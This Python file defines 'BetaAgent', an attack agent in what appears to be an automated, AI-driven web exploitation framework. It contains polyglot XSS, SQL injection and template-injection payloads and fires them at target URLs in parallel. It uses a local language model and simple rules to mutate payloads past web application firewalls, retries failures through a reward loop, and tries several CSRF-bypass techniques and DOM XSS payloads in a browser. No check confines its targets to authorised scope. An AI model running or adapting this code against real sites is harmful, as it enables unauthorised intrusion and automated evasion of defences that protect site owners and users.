import asyncio
import random
import hashlib
from backend.core.hive import EventType, HiveEvent
from backend.core.browser_agent import BrowserEnabledAgent
from backend.core.protocol import JobPacket, ResultPacket, AgentID, TaskPriority, ModuleConfig, TaskTarget

from backend.ai.cortex import CortexEngine, get_cortex_engine
import json
from backend.core.content_boundary import content_boundary
from backend.core.proxy import network_interceptor
from backend.core.sandbox import TempWorkspace
from backend.core.queue import command_lane, LanePriority

class BetaAgent(BrowserEnabledAgent):
    """
    AGENT BETA: THE BREAKER
    Role: Heavy Offensive Operations with Browser Exploitation.
    Capabilities:
    - Polyglot Payloads.
    - WAF Mutation Engine.
    - Real-time HTTP attack execution.
    - Browser-based XSS verification
    - CSRF token testing
    - DOM-based XSS detection
    - Clickjacking tests
    """
    def __init__(self, bus):
        super().__init__("agent_beta", bus)
        
        # CORTEX AI Integration (Local Ollama)
        try:
            self.ai = get_cortex_engine()
        except Exception:self.ai = None

        
        # SOTA: Polyglots triggering multiple parsers
        self.polyglots = [
            "javascript://%250Aalert(1)//\"/*'*/-->", # XSS + JS
            "' OR 1=1 UNION SELECT 1,2,3--",         # SQLi
            "{{7*7}}{% debug %}"                     # SSTI
        ]
        # Governance: throttle flag from Zeta
        self._throttled = False
        self._seen_payload_batches = set()
        
        # Browser Integration inherited from BrowserEnabledAgent
        # self.browser, self.session_manager, self.forensics available via properties

    async def setup(self):
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_job)
        self.bus.subscribe(EventType.VULN_CANDIDATE, self.handle_candidate)
        self.bus.subscribe(EventType.JOB_COMPLETED, self.handle_sigma_payloads)
        # Governance: respond to Zeta's control signals
        self.bus.subscribe(EventType.CONTROL_SIGNAL, self.handle_control_signal)

    async def handle_control_signal(self, event: HiveEvent):
        """Respond to Zeta governance signals."""
        signal = event.payload.get("signal", "")
        if signal in ["THROTTLE", "STEALTH_MODE"]:
            self._throttled = True
            print(f"[{self.name}] Governance: {signal} received. Throttling attacks.")
        elif signal == "RESUME":
            self._throttled = False

    async def handle_candidate(self, event: HiveEvent):
        # Handle polyglot injections on candidate detection
        payload = event.payload
        # ScanContext: record event for transcript causality
        if hasattr(self.bus, "get_or_create_context"):
            _ctx = self.bus.get_or_create_context(getattr(event, "scan_id", "GLOBAL"))
            _ctx.append_event(event)
        url = payload.get("url")
        tag = payload.get("tag")
        
        # Check if this is an XSS candidate that should be tested in browser
        if tag in ["XSS", "REFLECTED_XSS", "DOM_XSS"] or "xss" in str(payload.get("type", "")).lower():
            print(f"[{self.name}] XSS Candidate detected. Routing to browser-based testing...")
            await self._test_xss_browser(url, payload.get("payload", "<script>alert(1)</script>"), event.scan_id)
            return
        
        if tag == "API":
            print(f"[{self.name}] Intercepted API Candidate: {url}. Recall Phase Initiated.")
            
            # RECALL tactics from Kappa (V6 Learning Loop)
            from backend.core.orchestrator import HiveOrchestrator
            kappa = HiveOrchestrator.active_agents.get("KAPPA")
            
            best_payload = random.choice(self.polyglots) # Default
            if kappa:
                try:
                    results = await kappa.recall_tactics(f"Exploit for {payload.get('type', 'vulnerability')} on {url}")
                    if results:
                        best_payload = results[0].get("payload", best_payload)
                        print(f"[{self.name}] [RECALL SUCCESS] Reusing verified payload: {best_payload}")
                except Exception as e:
                    print(f"[{self.name}] [RECALL ERROR] {e}")

            mutated_polyglot = await self.waf_mutate(best_payload)
            print(f"[{self.name}] >> AI Mutation Strategy: {mutated_polyglot}")
            
            # FIXED: Actually execute the attack via real HTTP requests
            await self._execute_real_attack(url, mutated_polyglot, scan_id=event.scan_id)

    async def handle_job(self, event: HiveEvent):
        payload = event.payload
        try:
            packet = JobPacket(**payload)
        except Exception:return

        if packet.config.agent_id != AgentID.BETA:
            return

        print(f"[{self.name}] Received Breaker Job {packet.id}. Executing direct assault on {packet.target.url}")

        if packet.config.module_id == "sigma_payload_handoff":
            payloads = packet.config.params.get("payloads", []) if packet.config.params else []
            await self._execute_payload_batch(packet.target.url, payloads, event.scan_id)
            return
        
        # FIXED: Beta now executes attacks directly when receiving its own jobs
        # Execute polyglot payloads directly against the target
        target_url = packet.target.url
        for polyglot in self.polyglots:
            mutated = await self.waf_mutate(polyglot)
            await self._execute_real_attack(target_url, mutated, scan_id=event.scan_id)

    async def handle_sigma_payloads(self, event: HiveEvent):
        """Intercepts Sigma's payload shipments and executes the assault."""
        if event.source != "agent_sigma": return
        payload = event.payload
        
        data = payload.get("data", {})
        if "generated_payloads" not in data: return
        
        target_url = payload.get("target_url")
        if not target_url: return
        
        payloads = data["generated_payloads"]
        await self._execute_payload_batch(target_url, payloads, event.scan_id)

    def _normalize_payloads(self, payloads) -> list[str]:
        """Keep only concrete payload strings Beta can safely execute."""
        if isinstance(payloads, (str, bytes)):
            payloads = [payloads.decode() if isinstance(payloads, bytes) else payloads]
        if not isinstance(payloads, list):
            return []

        normalized = []
        seen = set()
        for item in payloads:
            if isinstance(item, dict):
                item = item.get("payload") or item.get("value") or item.get("attack") or ""
            value = str(item).strip()
            if not value or value.startswith("[") or len(value) > 4096:
                continue
            if value in seen:
                continue
            seen.add(value)
            normalized.append(value)
        return normalized

    async def _execute_payload_batch(self, target_url: str, payloads, scan_id: str = None):
        payloads = self._normalize_payloads(payloads)
        if not target_url or not payloads:
            return

        digest = hashlib.sha256(
            json.dumps({"target": target_url, "payloads": payloads}, sort_keys=True).encode("utf-8")
        ).hexdigest()
        batch_key = f"{scan_id or 'GLOBAL'}:{digest}"
        if batch_key in self._seen_payload_batches:
            return
        self._seen_payload_batches.add(batch_key)

        print(f"[{self.name}] Intercepted {len(payloads)} payloads from Sigma. Commencing RL Adaptive Execution.")
        try:
            import aiohttp
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async def execute_payload_rl(p, index: int, scan_id=None):
                    try:
                        await self.bus.publish(HiveEvent(
                            type=EventType.LIVE_ATTACK,
                            source=self.name,
                            scan_id=scan_id or "GLOBAL",
                            payload={"url": target_url, "arsenal": "Adaptive Fuzzer", "action": "Executing Payload", "payload": p[:50]}
                        ))
                        
                        reward = await self._execute_and_eval(session, target_url, p, scan_id=scan_id)
                        
                        if reward > 0:
                            print(f"[{self.name}] [+ REWARD] Successful payload interaction. Retaining strategy.")
                        else:
                            if index < 3:
                                print(f"[{self.name}] [- PENALTY] Payload failed. Executing AI mutation layer.")
                            mutated = await self.waf_mutate(p)
                            if mutated != p:
                                await self.bus.publish(HiveEvent(
                                    type=EventType.LIVE_ATTACK,
                                    source=self.name,
                                    scan_id=scan_id or "GLOBAL",
                                    payload={"url": target_url, "arsenal": "RL Mutation", "action": "Retrying Mutated Payload", "payload": mutated[:50]}
                                ))
                                await self._execute_and_eval(session, target_url, mutated, scan_id=scan_id)
                    except Exception as payload_err:
                        print(f"[{self.name}] [PAYLOAD ERROR] Skipping payload: {payload_err}")
                
                # Execute all AI generated payloads explicitly in parallel
                print(f"[{self.name}] Dispatching {len(payloads)} AI generative payloads concurrently...")
                await asyncio.gather(*[execute_payload_rl(p, i, scan_id) for i, p in enumerate(payloads)])
        except Exception as session_err:
            print(f"[{self.name}] [SESSION ERROR] Failed to create HTTP session: {session_err}")

    async def _execute_real_attack(self, url: str, payload_str: str, scan_id: str = None):
        """Execute a real HTTP attack against the target with the given payload."""
        import time
        from datetime import datetime
        from backend.api.socket_manager import publish_request_event
        
        # Broadcast attack intent
        await self.bus.publish(HiveEvent(
            type=EventType.LIVE_ATTACK,
            source=self.name,
            scan_id=scan_id or "GLOBAL",
            payload={"url": url, "arsenal": "Polyglot Injector", "action": "Injecting Payload", "payload": payload_str[:50]}
        ))
        
        start_t = time.time()
        try:
            target = url + ("&" if "?" in url else "?") + f"test={payload_str}"
            import aiohttp
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                response = await network_interceptor.fetch("GET", target, session=session, timeout=10)
                text = response.body
                status = response.status
                latency = response.elapsed_ms

                anomaly = False
                result = "OK"
                from backend.core.exploit_engine import MultiLayerVerifier
                base_status = 200
                base_text = ""
                try:
                    base_response = await network_interceptor.fetch("GET", url.split("?")[0], session=session, timeout=5)
                    base_status = base_response.status; base_text = base_response.body
                except Exception: pass

                verified, confidence, signals = MultiLayerVerifier.verify(
                    {"status": base_status, "response": base_text},
                    {"status": status, "body": text}
                )

                # Strict mathematical payload verification.
                if not verified or signals < 2:
                    return

                anomaly = True
                result = f"EXPLOIT VERIFIED (Signals: {signals})"

                try:
                    await publish_request_event({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "method": "GET",
                        "endpoint": url.split("?")[0][-30:] if len(url) > 30 else url,
                        "payload": payload_str[:25],
                        "status": status,
                        "latency": latency,
                        "result": result,
                        "anomaly": anomaly
                    }, scan_id=scan_id)
                except Exception:
                    pass

                evidence = content_boundary.wrap_http_response(status, response.headers, text, response.url)
                await self.bus.publish(HiveEvent(
                    type=EventType.VULN_CANDIDATE,
                    source=self.name,
                    scan_id=scan_id or "GLOBAL",
                    payload={
                        "url": url,
                        "payload": payload_str,
                        "description": evidence[:1200],
                        "evidence": f"HTTP {status} with payload '{payload_str[:80]}' triggered anomalous response."
                    }
                ))
                print(f"[{self.name}] [HIT] Anomaly detected on {url}: {result}")
        except Exception as e:
            print(f"[{self.name}] [ATTACK ERROR] {e}")

    async def _execute_and_eval(self, session, url: str, p: str, scan_id: str = None):
        """Executes a payload against a target URL and returns an RL reward score."""
        import time
        from datetime import datetime
        from backend.api.socket_manager import publish_request_event
        
        start_t = time.time()
        try:
            # We assume a GET request with query params for this example, but it scales
            target = url + ("&" if "?" in url else "?") + f"test={p}"
            response = await network_interceptor.fetch("GET", target, session=session, timeout=10)
            text = response.body
            status = response.status
            latency = response.elapsed_ms

            reward = 0
            evidence = ""
            anomaly = False
            result = "OK"

            from backend.core.exploit_engine import MultiLayerVerifier
            base_status = 200
            base_text = ""
            try:
                base_response = await network_interceptor.fetch("GET", url.split("?")[0], session=session, timeout=5)
                base_status = base_response.status; base_text = base_response.body
            except Exception: pass

            verified, conf, signals = MultiLayerVerifier.verify(
                {"status": base_status, "response": base_text},
                {"status": status, "body": text}
            )

            if verified and signals >= 2:
                reward = 1.0
                evidence = f"Mathematical verification via Jaccard metrics passed. Confidence: {conf}%. Signals: {signals}"
                anomaly = True
                result = "HARD_VERIFIED"
            else:
                return 0

            try:
                await publish_request_event({
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "method": "GET",
                    "endpoint": url.split("?")[0][-30:] if len(url) > 30 else url,
                    "payload": p[:25],
                    "status": status,
                    "latency": latency,
                    "result": result,
                    "anomaly": anomaly
                }, scan_id=scan_id)
            except Exception:
                pass

            if reward > 0:
                safe_response = content_boundary.wrap_http_response(status, response.headers, text, response.url)
                try:
                    vuln_id = await self.db.report_vulnerability(
                        scan_id=scan_id or "GLOBAL",
                        endpoint=url,
                        vuln_type=result,
                        severity="HIGH" if reward >= 1 else "MEDIUM",
                        evidence={"payload": p, "response_excerpt": safe_response[:800], "reward": reward},
                        validated_by=self.name
                    )

                    if vuln_id and vuln_id != "CACHED":
                        await self.db.log_exploit_result(vuln_id, {
                            "payload": p,
                            "worker_id": self.name,
                            "status": "EXPLOITED" if reward >= 1 else "PARTIAL",
                            "response": safe_response[:1200],
                            "time_ms": latency
                        })
                except Exception as db_err:
                    print(f"[{self.name}] DB Logging Error: {db_err}")

                await self.bus.publish(HiveEvent(
                    type=EventType.VULN_CANDIDATE,
                    source=self.name,
                    scan_id=scan_id or "GLOBAL",
                    payload={
                        "url": url,
                        "payload": p,
                        "description": safe_response[:1200],
                        "evidence": evidence
                    }
                ))
            return reward
        except Exception as e:
            return 0

    async def waf_mutate(self, payload: str) -> str:
        """
        CORTEX AI: WAF Bypass Mutation Engine
        Uses Ollama to generate intelligent WAF evasion variants.
        """
        if self.ai and self.ai.enabled:
            try:
                mutated = await self.ai.mutate_waf_bypass(payload)
                if mutated and mutated != payload:
                    mutated = content_boundary.sanitize_control_tokens(mutated)
                    return mutated
            except Exception as e:
                pass

        strategy = random.choice(["case_swap", "whitespace", "comment_split"])
        if strategy == "case_swap":
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif strategy == "whitespace":
            return payload.replace(" ", "/**/%09")
        elif strategy == "comment_split":
            return payload.replace("SELECT", "SEL/**/ECT")
        return payload

    async def _execute_packet(self, packet: JobPacket):
        """FIXED: Execute attack packet by dispatching via event bus to Sigma for arsenal execution."""
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_ASSIGNED,
            source=self.name,
            payload=packet.model_dump()
        ))
    
    # ============ BROWSER EXPLOITATION METHODS (Phase 2) ============
    
    async def _test_xss_browser(self, url: str, payload: str, scan_id: str):
        """Test XSS payload in real browser context with forensic evidence capture."""
        try:
            print(f"[{self.name}] Testing XSS in browser: {url} with payload: {payload[:50]}...")
            
            # Broadcast attack intent
            await self.bus.publish(HiveEvent(
                type=EventType.LIVE_ATTACK,
                source=self.name,
                scan_id=scan_id,
                payload={
                    "url": url,
                    "arsenal": "Browser XSS Tester",
                    "action": "Testing XSS in real browser",
                    "payload": payload[:50]
                }
            ))
            
            # Test payload in browser (auto-selects OpenClaw for XSS)
            result = await self.browser.test_payload(url, payload)
            
            if result.get("triggered"):
                print(f"[{self.name}] [XSS CONFIRMED] Payload triggered in browser!")
                
                # Capture forensic evidence
                screenshot_path = await self.forensics.capture_screenshot(
                    scan_id=scan_id,
                    context=result.get("context"),
                    engine="openclaw",
                    label="xss_triggered"
                )
                
                dom_path = await self.forensics.capture_dom_snapshot(
                    scan_id=scan_id,
                    context=result.get("context"),
                    engine="openclaw",
                    label="xss_dom"
                )
                
                # Publish verified vulnerability
                await self.bus.publish(HiveEvent(
                    type=EventType.VULN_CONFIRMED,
                    source=self.name,
                    scan_id=scan_id,
                    payload={
                        "type": "XSS_BROWSER_VERIFIED",
                        "url": url,
                        "payload": payload,
                        "severity": "HIGH",
                        "evidence": f"XSS triggered in browser. Screenshot: {screenshot_path}, DOM: {dom_path}",
                        "browser_verified": True
                    }
                ))
                
        except Exception as e:
            print(f"[{self.name}] Browser XSS test failed: {e}")
    
    async def _test_csrf_browser(self, url: str, scan_id: str):
        """Test CSRF token extraction and validation in browser."""
        try:
            print(f"[{self.name}] Testing CSRF protection: {url}")
            
            # Navigate to page and extract tokens
            result = await self.browser.extract_tokens(url)
            
            csrf_tokens = [t for t in result.get("tokens", []) if "csrf" in t.get("name", "").lower()]
            
            if csrf_tokens:
                print(f"[{self.name}] Found {len(csrf_tokens)} CSRF tokens")
                
                # Test if tokens are properly validated
                for token in csrf_tokens:
                    # Try request without token
                    test_result = await self._test_csrf_bypass(url, token, scan_id)
                    
                    if test_result.get("bypassed"):
                        await self.bus.publish(HiveEvent(
                            type=EventType.VULN_CONFIRMED,
                            source=self.name,
                            scan_id=scan_id,
                            payload={
                                "type": "CSRF_BYPASS",
                                "url": url,
                                "severity": "HIGH",
                                "evidence": f"CSRF token '{token['name']}' can be bypassed",
                                "browser_verified": True
                            }
                        ))
            
        except Exception as e:
            print(f"[{self.name}] CSRF test failed: {e}")
    
    async def _test_csrf_bypass(self, url: str, token: dict, scan_id: str) -> dict:
        """Attempt to bypass CSRF protection using various techniques."""
        try:
            print(f"[{self.name}] Testing CSRF bypass for token: {token.get('name')}")
            
            bypassed = False
            bypass_method = None
            
            # Technique 1: Try request without CSRF token
            try:
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    # Make request without token
                    response = await network_interceptor.fetch(
                        "POST",
                        url,
                        session=session,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=10
                    )
                    
                    # If request succeeds (2xx status), CSRF protection is bypassed
                    if 200 <= response.status < 300:
                        bypassed = True
                        bypass_method = "missing_token"
                        print(f"[{self.name}] CSRF bypass: Request succeeded without token")
            except Exception:
                pass
            
            # Technique 2: Try with empty token value
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "POST",
                            url,
                            session=session,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                token.get("name", "csrf_token"): ""
                            },
                            timeout=10
                        )
                        
                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "empty_token"
                            print(f"[{self.name}] CSRF bypass: Request succeeded with empty token")
                except Exception:
                    pass
            
            # Technique 3: Try with wrong token value
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "POST",
                            url,
                            session=session,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                token.get("name", "csrf_token"): "invalid_token_12345"
                            },
                            timeout=10
                        )
                        
                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "invalid_token"
                            print(f"[{self.name}] CSRF bypass: Request succeeded with invalid token")
                except Exception:
                    pass
            
            # Technique 4: Try changing request method (POST -> GET)
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "GET",
                            url,
                            session=session,
                            timeout=10
                        )
                        
                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "method_change"
                            print(f"[{self.name}] CSRF bypass: Request succeeded with method change")
                except Exception:
                    pass
            
            return {
                "bypassed": bypassed,
                "method": bypass_method,
                "token_name": token.get("name"),
                "url": url
            }
            
        except Exception as e:
            print(f"[{self.name}] CSRF bypass test failed: {e}")
            return {"bypassed": False, "error": str(e)}
    
    async def _test_dom_xss(self, url: str, scan_id: str):
        """Test for DOM-based XSS vulnerabilities."""
        try:
            print(f"[{self.name}] Testing DOM-based XSS: {url}")
            
            # DOM XSS payloads that trigger via JavaScript
            dom_payloads = [
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                "#<svg onload=alert(1)>",
                "?search=<img src=x onerror=alert(1)>"
            ]
            
            for payload in dom_payloads:
                test_url = url + payload
                
                result = await self.browser.navigate(test_url, stealth=False)
                
                if result.get("alert_detected"):
                    print(f"[{self.name}] [DOM XSS CONFIRMED] Payload: {payload}")
                    
                    # Capture evidence
                    await self.forensics.capture_screenshot(
                        scan_id=scan_id,
                        context=result.get("context"),
                        engine="openclaw",
                        label="dom_xss"
                    )
                    
                    await self.bus.publish(HiveEvent(
                        type=EventType.VULN_CONFIRMED,
                        source=self.name,
                        scan_id=scan_id,
                        payload={
                            "type": "DOM_XSS",
                            "url": test_url,
                            "payload": payload,
                            "severity": "HIGH",
                            "evidence": "DOM-based XSS triggered via client-side JavaScript",
                            "browser_verified": True
                        }
                    ))
                    break
            
        except Exception as e:
            print(f"[{self.name}] DOM XSS test failed: {e}")
    
    async def _test_clickjacking(self, url: str, scan_id: str):
        """Test for clickjacking vulnerabilities."""
        try:
            print(f"[{self.name}] Testing clickjacking protection: {url}")
            
            # Check X-Frame-Options and CSP frame-ancestors
            result = await self.browser.navigate(url, stealth=False)
            
            headers = result.get("headers", {})
            
            has_xfo = "x-frame-options" in [h.lower() for h in headers.keys()]
            has_csp_frame = any("frame-ancestors" in str(v).lower() for v in headers.values())
            
            if not has_xfo and not has_csp_frame:
                print(f"[{self.name}] [CLICKJACKING VULNERABLE] No frame protection headers")
                
                await self.bus.publish(HiveEvent(
                    type=EventType.VULN_CONFIRMED,
                    source=self.name,
                    scan_id=scan_id,
                    payload={
                        "type": "CLICKJACKING",
                        "url": url,
                        "severity": "MEDIUM",
                        "evidence": "Missing X-Frame-Options and CSP frame-ancestors headers",
                        "browser_verified": True
                    }
                ))
            
        except Exception as e:
            print(f"[{self.name}] Clickjacking test failed: {e}")
